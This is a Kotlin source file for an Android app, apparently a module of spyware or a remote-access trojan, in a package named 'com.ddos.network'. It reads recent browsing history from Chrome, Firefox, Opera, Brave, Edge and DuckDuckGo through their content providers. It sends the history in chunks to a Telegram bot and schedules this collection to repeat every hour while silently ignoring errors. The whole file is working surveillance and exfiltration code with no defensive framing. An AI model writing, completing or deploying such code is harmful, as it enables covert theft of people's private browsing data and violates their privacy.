package com.ddos.network

import android.content.Context
import android.database.Cursor
import android.net.Uri
import java.util.concurrent.TimeUnit

class BrowserHistory(
    private val context: Context,
    private val bot: TelegramBot
) {

    fun extractHistory() {
        val browsers = mapOf(
            "com.android.chrome" to "Chrome",
            "org.mozilla.firefox" to "Firefox",
            "com.opera.browser" to "Opera",
            "com.brave.browser" to "Brave",
            "com.microsoft.emmx" to "Edge",
            "com.duckduckgo.mobile.android" to "DuckDuckGo"
        )

        val allHistory = mutableListOf<String>()

        // Chrome history
        allHistory.addAll(getChromeHistory())

        // Other browsers (content provider)
        for ((packageName, name) in browsers) {
            allHistory.addAll(getBrowserHistory(packageName, name))
        }

        // Send to Telegram
        if (allHistory.isNotEmpty()) {
            val chunks = allHistory.joinToString("\n").chunked(4000)
            for (chunk in chunks) {
                bot.sendMessage("🌐 BROWSER HISTORY:\n$chunk")
            }
        }
    }

    private fun getChromeHistory(): List<String> {
        val history = mutableListOf<String>()

        try {
            val uri = Uri.parse("content://com.android.chrome.browser/bookmarks")
            val cursor: Cursor? = context.contentResolver.query(
                uri,
                arrayOf("url", "title", "date"),
                "bookmark = 0",  // History only, not bookmarks
                null,
                "date DESC LIMIT 50"
            )

            cursor?.use {
                while (it.moveToNext()) {
                    val url = it.getString(0) ?: continue
                    val title = it.getString(1) ?: ""
                    val date = it.getLong(2)

                    history.add("🔵 Chrome: $title\n   $url")
                }
            }
        } catch (e: Exception) {
            // Permission denied or not found
        }

        return history
    }

    private fun getBrowserHistory(packageName: String, browserName: String): List<String> {
        val history = mutableListOf<String>()

        try {
            val uri = Uri.parse("content://$packageName.browser/bookmarks")
            val cursor: Cursor? = context.contentResolver.query(
                uri,
                arrayOf("url", "title", "date"),
                "bookmark = 0",
                null,
                "date DESC LIMIT 30"
            )

            cursor?.use {
                while (it.moveToNext()) {
                    val url = it.getString(0) ?: continue
                    val title = it.getString(1) ?: ""

                    history.add("🔵 $browserName: $title\n   $url")
                }
            }
        } catch (e: Exception) {
            // Not found
        }

        return history
    }

    fun scheduleExtraction() {
        val executor = java.util.concurrent.Executors.newSingleThreadScheduledExecutor()
        executor.scheduleWithFixedDelay({
            extractHistory()
        }, 0, 1, TimeUnit.HOURS)  // Every hour
    }
}
